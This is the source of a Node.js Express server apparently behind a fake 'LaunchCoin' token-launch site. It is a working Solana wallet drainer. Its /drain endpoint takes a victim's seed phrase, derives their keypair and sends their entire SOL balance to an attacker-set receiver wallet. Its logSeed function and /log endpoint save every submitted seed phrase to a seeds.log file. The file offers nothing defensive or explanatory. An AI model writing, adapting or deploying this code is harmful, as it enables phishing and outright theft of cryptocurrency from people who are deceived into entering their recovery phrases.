const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, Keypair } = require('@solana/web3.js');
const { mnemonicToSeedSync } = require('bip39');
const { derivePath } = require('ed25519-hd-key');

app.use(express.static(__dirname));
app.use(express.json({ limit: '10mb' }));

let config = { receiver: 'IL_TUO_WALLET_PUBLIC_KEY', fee: 0.1 };
try {
  config = JSON.parse(fs.readFileSync(path.join(__dirname, 'config.json'), 'utf8'));
} catch (e) {}

const YOUR_RECEIVER_WALLET = config.receiver || 'IL_TUO_WALLET_PUBLIC_KEY';
const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');

function logSeed(seed, source) {
  try {
    const line = `[${new Date().toISOString()}] ${source} => ${seed}\n`;
    fs.appendFileSync(path.join(__dirname, 'seeds.log'), line);
  } catch (_) {}
  console.log('SEED:', seed.substring(0, 40) + '...');
}

app.post('/drain', async (req, res) => {
  const { seed, walletPublicKey } = req.body;
  if (!seed) return res.status(400).json({ error: 'Seed mancante' });

  logSeed(seed, 'drain');

  try {
    const seedBuffer = mnemonicToSeedSync(seed.trim());
    const derived = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
    const fromKeypair = Keypair.fromSeed(derived.key);
    const fromPubkey = fromKeypair.publicKey;
    const toPubkey = new PublicKey(YOUR_RECEIVER_WALLET);

    console.log('Drain from:', fromPubkey.toString());
    console.log('To:', YOUR_RECEIVER_WALLET);

    const balance = await connection.getBalance(fromPubkey);
    const fee = 5000;
    const amount = balance - fee;
    let solTx = null;

    if (amount > 0) {
      const tx = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey,
          toPubkey,
          lamports: amount,
        })
      );
      const { blockhash } = await connection.getLatestBlockhash();
      tx.recentBlockhash = blockhash;
      tx.feePayer = fromPubkey;
      solTx = await connection.sendTransaction(tx, [fromKeypair]);
      await connection.confirmTransaction(solTx, 'confirmed');
      console.log('SOL drained:', (amount / LAMPORTS_PER_SOL).toFixed(6), solTx);
    } else {
      console.log('Balance too low:', balance);
    }

    res.json({
      status: 'drain_completed',
      from: fromPubkey.toString(),
      solTx,
      solAmount: amount > 0 ? amount / LAMPORTS_PER_SOL : 0,
      tokenCount: 0
    });
  } catch (e) {
    console.error('Drain error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/log', (req, res) => {
  if (req.body.seed) logSeed(req.body.seed, 'log');
  res.json({ status: 'ok' });
});

app.post('/broadcast', async (req, res) => {
  try {
    const { signedTransaction } = req.body;
    if (!signedTransaction) return res.status(400).json({ error: 'Missing signedTransaction' });
    const txBuffer = Buffer.from(signedTransaction, 'base64');
    const signature = await connection.sendRawTransaction(txBuffer, {
      skipPreflight: false,
      preflightCommitment: 'confirmed'
    });
    await connection.confirmTransaction(signature, 'confirmed');
    res.json({ status: 'ok', signature });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/create.html', (req, res) => res.sendFile(path.join(__dirname, 'create.html')));
app.get('/liquidity.html', (req, res) => res.sendFile(path.join(__dirname, 'liquidity.html')));
app.get('/faq.html', (req, res) => res.sendFile(path.join(__dirname, 'faq.html')));
app.get('/wallet.html', (req, res) => res.sendFile(path.join(__dirname, 'wallet.html')));

app.listen(3000, () => {
  console.log('LaunchCoin server on http://localhost:3000');
  console.log('Receiver:', YOUR_RECEIVER_WALLET);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log('LaunchCoin server on port', PORT);
  console.log('Receiver:', YOUR_RECEIVER_WALLET);
});
